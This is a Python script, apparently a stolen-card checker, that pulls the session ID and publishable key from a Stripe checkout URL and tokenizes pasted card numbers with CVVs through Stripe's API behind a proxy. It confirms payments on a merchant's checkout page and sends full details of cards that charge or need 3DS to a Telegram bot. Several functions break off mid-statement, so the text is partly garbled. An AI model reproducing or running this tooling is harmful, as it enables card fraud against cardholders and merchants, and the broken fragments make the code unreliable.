_session = None
_session_lock = asyncio.Lock()


async def get_session():
    global _session
    if _session is not None and not _session.closed:
        try:
            if not _session.connector or _session.connector.closed:
                _session = None
            else:
                return _session
        except Exception:
            _session = None
    async with _session_lock:
        if _session is None or _session.closed:
            connector = aiohttp.TCPConnector(
                limit=500, limit_per_host=50,
                ttl_dns_cache=600, keepalive_timeout=60,
                enable_cleanup_closed=True, force_close=False,
            )
            _session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=15, connect=5, sock_connect=5),
                headers={"Connection": "keep-alive"},
            )
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
        _session = None

async def tg_send(text, parse_mode="HTML"):
    if not TG_TOKEN or not TG_CHAT:
        return False
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {
        "chat_id": TG_CHAT,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
    }
    try:
        s = await get_session()
        async with s.post(url, data=payload,
                          timeout=aiohttp.ClientTimeout(total=10)) as r:
            d = await r.json(content_type=None)
            return bool(d.get("ok"))
    except Exception:
        return False

def decode_stripe_fragment(fragment):
    if not fragment:
        return None, {}
    try:
        frag = unquote(fragment)
        pad = "=" * ((4 - len(frag) % 4) % 4)
        try:
            raw = base64.b64decode(frag + pad)
        except Exception:
            fsafe = frag.replace("-", "+").replace("_", "/")
            raw = base64.b64decode(fsafe + pad)
        xored = "".join(chr(b ^ 0x05) for b in raw)
        try:
            data = json.loads(xored)
            if isinstance(data, dict):
                pk = data.get("apiKey") or data.get("publishableKey") or data.get("pk")
                return pk, data
        except Exception:
            pass
        m = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
        if m:
            return m.group(0), {"raw": xored[:500]}
        return None, {"raw": xored[:500]}
    except Exception as e:
        return None, {"error": str(e)[:100]}


def extract_cs(url):
    url_no_frag = url.split("#")[0]
    for variant in ("live", "test"):
        cs = rf"cs_{variant}_[A-Za-z0-9]+"
        for search_url in (url_no_frag, url):
            for p in [
                rf"/c/pay/({cs})(?:[#%/?]|$)",
                rf"/f/pay/({cs})(?:[#%/?]|$)",
                rf"({cs})(?=[#%/?&\s]|$)",
                rf"({cs})",
            ]:
                m = re.search(p, search_url)
                if m:
                    token = re.sub(r"[^A-Za-z0-9]+$", "", m.group(1))
                    if len(token) > 20:
                        return token
    return None


def extract_pk(url, html=""):
    if "#" in url:
        frag = url.split("#", 1)[1]
        pk, _ = decode_stripe_fragment(frag)
        if pk:
            return pk
    for variant in ("live", "test"):
        for target in (html, url):
            if not target:
                continue
            m = re.search(rf"pk_{variant}_[A-Za-z0-9]+", target)
            if m:
                return m.group(0)
    return None


def _resolve_amounts(init_data):
    lig = init_data.get("line_item_group") or {}
    inv = init_data.get("invoice") or {}
    pi  = init_data.get("payment_intent") or {}
    raw = None
    cur = "USD"

    lpm = lig.get("localized_prices_metas") or []
    if isinstance(lpm, list):
        usd = next((m for m in lpm if isinstance(m, dict)
                    and m.get("currency") == "usd"), None)
        if usd and usd.get("total", 0) > 0:
            raw = int(usd["total"])
            cur = "USD"

    if raw is None:
        perm = lig.get("presentment_exchange_rate_meta") or {}
        if (perm.get("integration_currency")
                and perm.get("exchange_rate")
                and lig.get("total")):
            try:
                rate = float(perm["exchange_rate"])
                if rate > 0:
                    raw = round(lig["total"] / rate)
                    cur = perm["integration_currency"].upper()
            except Exception:
                pass

    if raw is None:
        for f in ("total", "due", "subtotal"):
            v = lig.get(f)
            if v and isinstance(v, (int, float)) and v > 0:
                raw = int(v)
                cur = (lig.get("currency") or "USD").upper()
                break

    if raw is None:
        for f in ("amount_due", "total"):
            v = inv.get(f)
            if v and isinstance(v, (int, float)) and v > 0:
                raw = int(v)
                cur = (inv.get("currency") or "USD").upper()
                break

    if raw is None:
        v = pi.get("amount")
        if v and isinstance(v, (int, float)) and v > 0:
            raw = int(v)
            cur = (pi.get("currency") or "USD").upper()

    total = raw or 0
    try:
        subtotal = int(lig.get("subtotal") or 0) or total
    except Exception:
        subtotal = total
    return total, subtotal, cur

            "key": pk, "eid": "NA",
            "browser_locale": "en-US",

            "redirect_type": "url",
        })
        kw = {"headers": HDR_CHECKOUT, "data": body,

        return d, None
    except Exception as e:
        return None, str(e)[:100]

async def _tokenize(s, card, pk, billing, guid, proxy_url):
    async def _try_one(label, endpoint, headers, pua, is_token):
        params = _build_tokenize_params(card, billing, guid, pua, is_token)
        params["key"] = pk
        kw = {"headers": headers, "data": urlencode(params),
              "timeout": aiohttp.ClientTimeout(total=6)}
        if proxy_url:
            kw["proxy"] = proxy_url
        try:
            async with s.post(f"https://api.stripe.com{endpoint}", **kw) as r:
                resp = await r.json(content_type=None)
        except Exception:
            return None
        if "error" in resp:
            err = resp["error"]
            code = (err.get("code") or "").lower()
            if code in ("card_declined", "incorrect_number", "invalid_number",
                        "expired_card", "incorrect_cvc", "lost_card",
                        "stolen_card", "pickup_card", "restricted_card"):
                raise RuntimeError(f"{code}: {err.get('message','')[:80]}")
            return None
        rid = resp.get("id", "")
        if rid.startswith("pm_"):
            return rid, None, label
        if rid.startswith("tok_"):
            return None, rid, label
        return None

    async def _safe(args):
        return await _try_one(*args)

    fast = [asyncio.create_task(_safe(s)) for s in STRATEGIES[:3]]
    pending = set(fast)
    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for f in done:
            try:
                r = f.result()
            except RuntimeError:
                for t in pending: t.cancel()
                return None, None, str(f.exception())[:80]
            except Exception:
                continue
            if r is not None:
                for t in pending: t.cancel()
                return r
    for t in fast:
        if not t.done(): t.cancel()

    slow = [asyncio.create_task(_safe(s)) for s in STRATEGIES[3:]]
    pending = set(slow)
    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for f in done:
            try:
                r = f.result()
            except RuntimeError:
                for t in pending: t.cancel()
                return None, None, str(f.exception())[:80]
            except Exception:
                continue
            if r is not None:
                for t in pending: t.cancel()
                return r
    return None, None, "Card Declined - all surfaces failed"


def _parse_conf(conf):
    if "error" in conf:
        err = conf["error"]
        code = (err.get("code") or "").upper()
        msg = err.get("message", "")
        msg_l = msg.lower()
        if "authentication" in msg_l or "3d" in msg_l:
            return "3DS", "3DS Required"
        return "DECLINED", f"{code}: {msg}"[:120] if code else msg[:120]

    pi = conf.get("payment_intent") or conf
    si = conf.get("setup_intent") or {}
    if conf.get("object") == "setup_intent":
        si = conf
        pi = {}

    st = pi.get("status") or si.get("status") or conf.get("status") or ""
    if st in ("succeeded", "complete"):
        return "CHARGED", "Payment Successful"
    if st in ("requires_action", "requires_source_action"):
        return "3DS", "3DS Required (verify)"
    if st == "requires_payment_method":
        lpe = pi.get("last_payment_error") or si.get("last_payment_error") or {}
        msg = lpe.get("message") or lpe.get("code") or "Card Declined"
        return "DECLINED", msg[:120]
    return "UNKNOWN", f"status: {st}"[:80] if st else "Unknown"


async def fetch_pi_action(s, conf, pk, proxy_url=None):

    si_id  = si_obj.get("id", "")
    si_sec = si_obj.get("client_secret", "")

    itype = "payment_intents" if pi_id else "setup_intents"
    iid   = pi_id or si_id
    isec  = pi_sec or si_sec

    if not iid or not isec:
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} no PI/SI id in response")
        return None

    try:
        async with s.get(
            f"https://api.stripe.com/v1/{itype}/{iid}",
            headers={"user-agent": _UA, "accept": "application/json"},
            params={"client_secret": isec, "key": pk},
            proxy=proxy_url,

        ) as r:
            d = await r.json(content_type=None)
    except Exception as e:
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} fetch error: {e}")
        return None

    if "error" in d:
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} PI error: {d['error'].get('message')}")
        return None

    st = d.get("status", "")
    na = d.get("next_action") or {}
    na_type = na.get("type", "NONE")

    print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} PI status       = {st}")
    print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} next_action.type = {na_type}")

    if na_type == "use_stripe_sdk":
        sdk = na.get("use_stripe_sdk") or {}
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} use_stripe_sdk = {json.dumps(sdk)[:500]}")
    elif na_type == "redirect_to_url":
        rtu = na.get("redirect_to_url") or {}
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} redirect_url   = {rtu.get('url', '')[:250]}")
    elif na_type != "NONE":
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} full next_action = {json.dumps(na)[:500]}")

    lpe = d.get("last_payment_error")
    if lpe:
        print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} last_payment_error = {json.dumps(lpe)[:400]}")

    if itype == "setup_intents":
        la = d.get("latest_attempt") or {}
        if la:
            print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} SI.latest_attempt.status = {la.get('status', '')}")
            print(f"  {Fore.LIGHTMAGENTA_EX}[DEBUG]{Fore.RESET} SI.latest_attempt = {json.dumps(la)[:400]}")

    print()
    return d

        p["last_displayed_line_item_group_details[total_exclusive_tax]"]   = 0

        p["last_displayed_line_item_group_details[total_discount_amount]"] = 0
        p["last_displayed_line_item_group_details[shipping_rate_amount]"]  = 0
    return p


def parse_card(line):
    parts = re.split(r'[|/\\\s,]+', line.strip())
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not 15 <= len(cc) <= 19:
        return None
    mm = parts[1].strip().zfill(2)
    if not mm.isdigit() or not 1 <= int(mm) <= 12:
        return None
    yy = parts[2].strip()
    if len(yy) == 2:
        yy = "20" + yy
    if not yy.isdigit() or len(yy) != 4:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if len(cvv) not in (3, 4):
        return None
    return {"cc": cc, "month": mm, "year": yy, "cvv": cvv}

async def check_one_card(card, pk, cs, proxy_url=None):
    t0 = time.perf_counter()
    res = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None, "response": None, "time": 0,
    }

    init, err = await init_cs(pk, cs, proxy_url)
    if err or not init:
        res.update({"status": "CS_DEAD", "response": err or "init failed",
                    "time": round(time.perf_counter() - t0, 2)})
        return res

    try:
        s = await get_session()
        guid = _guid()
        billing = {
            "name": "Test User", "email": "test@example.com",
            "country": "US", "line1": "3280 Peachtree Rd NE",
            "city": "Atlanta", "state": "GA", "zip_code": "30305",
        }

        pm_id, tok_id, label = await _tokenize(s, card, pk, billing, guid, proxy_url)
        if not pm_id and not tok_id:
            res.update({"status": "DECLINED", "response": label,
                        "time": round(time.perf_counter() - t0, 2)})
            return res

        params = _build_confirm_params(pk, cs, pm_id, init)
        kw = {"headers": HDR_CHECKOUT, "data": urlencode(params),
              "timeout": aiohttp.ClientTimeout(total=12)}
        if proxy_url:
            kw["proxy"] = proxy_url
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", **kw
        ) as r:
            conf = await r.json(content_type=None)

        if "error" in conf:
            err_msg  = (conf["error"].get("message") or "").lower()
            err_code = (conf["error"].get("code") or "").upper()
            if ("paymentintent's payment_method could not be updated" in err_msg
                    or "unexpected_state" in err_code.lower()
                    or "has a status of can" in err_msg):
                res.update({"status": "CS_DEAD",
                            "response": "CS used",
                            "time": round(time.perf_counter() - t0, 2)})
                return res

        status, response = _parse_conf(conf)

        if status == "3DS":
            await fetch_pi_action(s, conf, pk, proxy_url)
            response = "3DS Required - LIVE (OTP)"

        res.update({"status": status, "response": response,
                    "time": round(time.perf_counter() - t0, 2)})
    except Exception as e:
        res.update({"status": "ERROR", "response": str(e)[:100],
                    "time": round(time.perf_counter() - t0, 2)})
    return res

W = 62

def _line(ch="="):
    return ch * W


def banner():
    print(f"""
{Fore.LIGHTCYAN_EX}+{_line('-')}+
|{' ' * W}|
|   {Fore.LIGHTWHITE_EX}{SCRIPT_NAME:<58}{Fore.LIGHTCYAN_EX}|
|   {Fore.LIGHTWHITE_EX}{SCRIPT_VERSION + '  |  ' + AUTHOR:<58}{Fore.LIGHTCYAN_EX}|
|{' ' * W}|
+{_line('-')}+
{Fore.RESET}""")


def section(title):
    pad = W - len(title) - 3
    if pad < 0:
        pad = 0
    print(f"{Fore.LIGHTCYAN_EX}+{_line('-')}+")
    print(f"| {Fore.LIGHTWHITE_EX}{title}{Fore.LIGHTCYAN_EX}{' ' * pad}|")
    print(f"+{_line('-')}+{Fore.RESET}")


def section_results():
    print(f"""
{Fore.LIGHTCYAN_EX}+{_line('-')}+
| {Fore.LIGHTWHITE_EX}{'RESULTS':<{W-2}}{Fore.LIGHTCYAN_EX}|
+{_line('-')}+{Fore.RESET}
""")


# ==============================================================
#  MAIN
# ==============================================================
async def main():
    global TG_TOKEN, TG_CHAT

    banner()

    # ---- 1) TELEGRAM ----------------------------------------
    section("TELEGRAM CONFIG")
    TG_TOKEN = input(f"  {Fore.LIGHTCYAN_EX}Bot Token :{Fore.RESET} ").strip()
    TG_CHAT  = input(f"  {Fore.LIGHTCYAN_EX}Chat ID   :{Fore.RESET} ").strip()

    if TG_TOKEN and TG_CHAT:
        ok = await tg_send(
            f"<b>[+] {SCRIPT_NAME} {SCRIPT_VERSION}</b>\n"
            f"<b>-------------------------</b>\n"
            f"Connected.\n"
            f"<i>By {AUTHOR}</i>"
        )
        if ok:
            print(f"  {Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Telegram connected\n")
        else:
            print(f"  {Fore.LIGHTYELLOW_EX}[!]{Fore.RESET} Telegram connect failed - continuing\n")
    else:
        print(f"  {Fore.LIGHTYELLOW_EX}[!]{Fore.RESET} Telegram disabled\n")

    # ---- 2) STRIPE CONFIG -----------------------------------
    section("STRIPE CONFIG")
    url = input(f"  {Fore.LIGHTCYAN_EX}Stripe URL:{Fore.RESET} ").strip()
    if not url:
        print(f"  {Fore.LIGHTRED_EX}[-]{Fore.RESET} no url")
        return

    proxy_str = input(f"  {Fore.LIGHTCYAN_EX}Proxy host:port:user:pass (blank=none):{Fore.RESET} ").strip() or None
    proxy_url = None
    if proxy_str:
        try:
            if "@" in proxy_str:
                auth, host_part = proxy_str.rsplit("@", 1)
                u, p = auth.split(":", 1)
                h, pt = host_part.rsplit(":", 1)
                proxy_url = f"http://{u}:{p}@{h}:{pt}"
            else:
                parts = proxy_str.split(":")
                if len(parts) == 4:
                    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif len(parts) == 2:
                    proxy_url = f"http://{parts[0]}:{parts[1]}"
        except Exception:
            pass

    print(f"\n  {Fore.LIGHTYELLOW_EX}[*]{Fore.RESET} Fetching checkout...")

    cs = extract_cs(url)
    if not cs:
        print(f"  {Fore.LIGHTRED_EX}[-]{Fore.RESET} cs not found")
        return

    s = await get_session()
    html = ""
    try:
        async with s.get(url, headers={"user-agent": _UA, "accept": "text/html,*/*"},
                         timeout=aiohttp.ClientTimeout(total=8),
                         allow_redirects=True,
                         proxy=proxy_url) as r:
            if r.status == 200:
                html = await r.text(errors="replace")
    except Exception:
        pass

    pk = extract_pk(url, html)
    if not pk:
        print(f"  {Fore.LIGHTRED_EX}[-]{Fore.RESET} pk not found")
        await close_session()
        return

    print(f"  {Fore.LIGHTGREEN_EX}[+]{Fore.RESET} CS: {cs[:50]}...")
    print(f"  {Fore.LIGHTGREEN_EX}[+]{Fore.RESET} PK: {pk[:50]}...")

    init, err = await init_cs(pk, cs, proxy_url)
    if err or not init:
        print(f"  {Fore.LIGHTRED_EX}[-]{Fore.RESET} init failed: {err}")
        await close_session()
        return

    total, subtotal, cur = _resolve_amounts(init)
    price = total / 100 if total else 0
    acc = init.get("account_settings") or {}
    merchant = acc.get("display_name") or acc.get("business_name") or "N/A"
    print(f"  {Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Merchant: {merchant}")
    print(f"  {Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Amount  : {price:.2f} {cur}")
    print()

    # ---- 3) CARDS -------------------------------------------
    section("CARDS INPUT")
    print(f"  {Style.DIM}format: CC|MM|YY|CVV  -  blank line to finish{Style.RESET_ALL}")
    print()
    cards = []
    while len(cards) < 10:
        line = input(f"  {Style.DIM}{len(cards)+1:02d}/10 >{Style.RESET_ALL} ").strip()
        if not line:
            break
        c = parse_card(line)
        if not c:
            print(f"  {Fore.LIGHTRED_EX}[-]{Fore.RESET} bad format - skip")
            continue
        cards.append(c)

    if not cards:
        print(f"  {Fore.LIGHTRED_EX}[-]{Fore.RESET} no cards")
        await close_session()
        return

    print(f"\n  {Fore.LIGHTCYAN_EX}[*]{Fore.RESET} checking {len(cards)} card(s)...\n")

    results = []
    live = []
    dead = []
    tds = []
    errors = []

    for i, card in enumerate(cards, 1):
        masked = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}|{card['cvv']}"

        init, err = await init_cs(pk, cs, proxy_url)
        if err or not init:
            print(f"  [{i:02d}/{len(cards)}] {Fore.LIGHTMAGENTA_EX}CS_DEAD{Fore.RESET}")
            print(f"  {Style.DIM}      consumed by previous card{Style.RESET_ALL}")
            break

        r = await check_one_card(card, pk, cs, proxy_url)

        if r["status"] == "CHARGED":
            color = Fore.LIGHTGREEN_EX
            live.append(r)
        elif r["status"] == "3DS":
            color = Fore.LIGHTYELLOW_EX
            tds.append(r)
            live.append(r)
        elif r["status"] == "DECLINED":
            color = Fore.LIGHTRED_EX
            dead.append(r)
        elif r["status"] == "CS_DEAD":
            color = Fore.LIGHTMAGENTA_EX
            print(f"  [{i:02d}/{len(cards)}] {color}{r['status']:10}{Fore.RESET} {masked}")
            print(f"  {Style.DIM}      stopped - CS consumed{Style.RESET_ALL}")
            break
        else:
            color = Fore.LIGHTYELLOW_EX
            errors.append(r)

        results.append(r)
        print(f"  [{i:02d}/{len(cards)}] {color}{r['status']:10}{Fore.RESET} "
              f"{masked} | {r['response'][:45]:45} | {r['time']}s")

        if r["status"] in ("CHARGED", "3DS"):
            bin6 = _bin_info(card["cc"])
            report = {
                "card_full": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
                "bin":       bin6,
                "status":    r["status"],
                "response":  r["response"],
                "time":      r["time"],
                "price":     price,
                "currency":  cur,
                "merchant":  merchant,
                "site_url":  url,
                "cs":        cs,
                "pk":        pk,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            }
            sent = await tg_send_hit(report)
            if sent:
                print(f"  {Fore.LIGHTCYAN_EX}        -> sent to Telegram{Fore.RESET}")
            elif TG_TOKEN and TG_CHAT:
                print(f"  {Fore.LIGHTYELLOW_EX}        -> telegram send failed{Fore.RESET}")

    # ---- 4) RESULTS -----------------------------------------
    section_results()

    if results:
        print(f"  {Fore.LIGHTWHITE_EX}{'CARD':<45} {'STATUS':<12} RESPONSE{Fore.RESET}")
        print(f"  {Style.DIM}{'-' * 90}{Style.RESET_ALL}")
        for r in results:
            icon = {"CHARGED": "+", "3DS": "~", "DECLINED": "x"}.get(r["status"], "?")
            print(f"  {icon} {r['card']:45} {r['status']:<12} {r['response'][:60]}")

    print()
    print(f"  {Fore.LIGHTGREEN_EX}Live   : {len(live)}{Fore.RESET}")
    print(f"  {Fore.LIGHTYELLOW_EX}  3DS  : {len(tds)}{Fore.RESET}")
    print(f"  {Fore.LIGHTRED_EX}Dead   : {len(dead)}{Fore.RESET}")
    if errors:
        print(f"  {Fore.LIGHTYELLOW_EX}Errors : {len(errors)}{Fore.RESET}")
    print(f"  {Fore.LIGHTCYAN_EX}Total  : {len(results)}{Fore.RESET}")

    ts = time.strftime("%Y%m%d_%H%M%S")
    if live:
        fname = f"live_{ts}.txt"
        with open(fname, "w") as f:
            for r in live:
                f.write(f"{r['card']} | {r['status']} | {r['response']}\n")
        print(f"\n  {Fore.LIGHTGREEN_EX}[+]{Fore.RESET} saved -> {fname}")

    if dead:
        fname = f"dead_{ts}.txt"
        with open(fname, "w") as f:
            for r in dead:
                f.write(f"{r['card']} | {r['response']}\n")
        print(f"  {Fore.LIGHTRED_EX}[+]{Fore.RESET} saved -> {fname}")

    await close_session()

    print(f"""
{Fore.LIGHTCYAN_EX}+{_line('-')}+
| {Fore.LIGHTWHITE_EX}{'Done.':<{W-2}}{Fore.LIGHTCYAN_EX}|
| {Fore.LIGHTWHITE_EX}{(AUTHOR + '  ' + SCRIPT_VERSION):<{W-2}}{Fore.LIGHTCYAN_EX}|
+{_line('-')}+{Fore.RESET}
""")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n  {Fore.LIGHTYELLOW_EX}[!]{Fore.RESET} Interrupted")
        sys.exit(0)
